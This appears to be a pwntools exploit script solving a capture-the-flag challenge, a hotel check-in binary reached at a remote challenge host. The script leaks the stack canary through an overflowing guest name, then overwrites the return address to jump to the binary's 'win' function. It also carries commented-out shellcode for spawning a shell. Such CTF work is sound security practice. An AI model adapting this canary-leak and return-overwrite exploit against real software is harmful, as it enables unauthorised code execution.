#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=13.212.234.124' '--port=11102' ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '13.212.234.124'
port = int(args.PORT or 11102)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *0x00401aa6
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fb000)
# RUNPATH:  b'.'

io = start()

def check_in(index):
    io.sendline(b"1")
    io.sendafter(
        b"Enter guest name: ",
        b"A" * 41
    )
    io.sendlineafter(
        b"Enter room number: ",
        str(index).encode()
    )

    io.clean()

def get_canary():
    io.sendline(b"2")
    leak = u64(io.recvline_startswith(b"Guest 10").split(b",")[0].split(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")[1][0:7].rjust(8, b"\x00"))
    io.clean()
    return leak

def exit():
    io.sendline(b"5")

def jump_to(canary, ret_to):
    io.sendline(b"4")
    io.sendlineafter(
        b"Enter room number to edit: ",
        b"9"
    )
    io.sendlineafter(
        b"Enter new guest name: ",
        b"A" * 40 + p64(canary) + b"A" * 8 + p64(ret_to)
    )
    io.sendlineafter(
        b"Enter new room number: ",
        b"9"
    )
    io.clean()

    exit()
    

# Solve Here

for i in range(10):
    check_in(i)

canary = get_canary()

print("Leaked Canary: ", hex(canary))
print("Cyclic found (ret): ", cyclic_find("oaaapaaa"))
print("Cyclic found (canary): ", cyclic_find("kaaalaaa"))

jump_to(canary, exe.symbols["win"])

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

